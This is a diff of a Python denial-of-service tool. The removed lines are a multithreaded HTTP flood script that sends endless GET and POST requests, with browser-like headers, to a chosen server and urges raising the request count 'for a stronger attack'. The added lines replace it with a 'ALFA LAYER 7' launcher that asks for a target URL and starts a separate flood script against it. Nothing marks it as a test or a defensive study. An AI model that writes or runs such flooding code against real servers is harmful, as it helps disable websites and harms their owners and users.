@@ -1,94 +1,42 @@
-import requests
 import random
-import time
-import threading
+import requests
+from time import sleep
+import re
+import os
+import subprocess
+from rich.console import Console
+import pyfiglet
 
-# Target URL
-target_url = "http://target_server.com"  # Change this to your target server's URL
+console = Console()
 
-# Number of requests to be sent
-num_requests = 5000  # Increase this number for a stronger attack
+# Function to validate URL
+def is_valid_url(url: str) -> bool:
+    regex = re.compile(
+        r'^(?:http|ftp)s?://' 
+        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|' 
+        r'localhost|' 
+        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|' 
+        r'?[A-F0-9]*:[A-F0-9:]+?)' 
+        r'(?::\d+)?' 
+        r'(?:/?|[/?]\S+)$', re.IGNORECASE)
+    return re.match(regex, url) is not None
 
-# Payload to be sent with POST requests (optional, can be customized)
-payload = {
-    'data': 'test_data',
-    'action': 'attack'
-}
+# Display banner
+banner = pyfiglet.figlet_format("ALFA LAYER 7")
+console.print(f"[bold red]{banner}[/bold red]")
 
-# Function to simulate overload with GET requests
-def overload_server_get():
-    while True:
-        try:
-            # Simulate a GET request to the target URL
-            response = requests.get(target_url, timeout=3)
-            if response.status_code == 200:
-                print(f"[+] Successfully sent a GET request to {target_url}")
-            else:
-                print(f"[-] GET request failed, Status Code: {response.status_code}")
-        except requests.exceptions.RequestException as e:
-            print(f"[!] Error in GET request: {str(e)}")
+# Get user input for URL and validate it
+while True:
+    target_url = console.input("[red]│   └───URL: [/red]")
+    if not is_valid_url(target_url):
+        console.print("[bold red]Error: Invalid URL! Please enter a valid URL.[/bold red]")
+    else:
+        break
 
-# Function to simulate overload with POST requests
-def overload_server_post():
-    while True:
-        try:
-            # Simulate a POST request with payload to the target URL
-            response = requests.post(target_url, data=payload, timeout=3)
-            if response.status_code == 200:
-                print(f"[+] Successfully sent a POST request to {target_url}")
-            else:
-                print(f"[-] POST request failed, Status Code: {response.status_code}")
-        except requests.exceptions.RequestException as e:
-            print(f"[!] Error in POST request: {str(e)}")
+console.print(f"[green]Targeting: {target_url}[/green]")
 
-# Function to simulate attack via multiple threads
-def start_attack():
-    print(f"[+] Starting server overload attack on {target_url}...\n")
-    threads = []
+# Start overload_server.py and pass the target URL
+console.print("[yellow]Starting Overload Attack...[/yellow]")
+subprocess.Popen(["python", "overload_server.py", target_url])
 
-    # Choose whether to perform GET or POST attack based on your preference
-    attack_type = random.choice(['GET', 'POST'])
-
-    for _ in range(num_requests):
-        if attack_type == 'GET':
-            thread = threading.Thread(target=overload_server_get)
-        else:
-            thread = threading.Thread(target=overload_server_post)
-
-        threads.append(thread)
-        thread.start()
-        time.sleep(random.uniform(0.1, 0.5))  # Random delay between thread starts
-
-    # Wait for all threads to finish
-    for thread in threads:
-        thread.join()
-
-# Enhanced attack strength via additional techniques (e.g., headers, randomizing)
-def enhanced_attack():
-    print(f"[+] Enhancing attack with random headers and payloads...\n")
-    headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
-        "Accept-Encoding": "gzip, deflate, br",
-        "Accept-Language": "en-US,en;q=0.9",
-    }
-
-    for _ in range(num_requests):
-        try:
-            # Send GET request with random headers for extra confusion
-            response = requests.get(target_url, headers=headers, timeout=3)
-            if response.status_code == 200:
-                print(f"[+] Successfully sent a GET request with headers to {target_url}")
-            else:
-                print(f"[-] GET request with headers failed, Status Code: {response.status_code}")
-        except requests.exceptions.RequestException as e:
-            print(f"[!] Error in enhanced GET request: {str(e)}")
-
-# Execute attack with overload and enhancement
-def execute_attack():
-    start_attack()  # Perform initial attack
-    enhanced_attack()  # Add enhanced attack
-
-# Main function
-if __name__ == "__main__":
-    execute_attack()
+console.print("[bold green]Overload Server Attack Started![/bold green]")
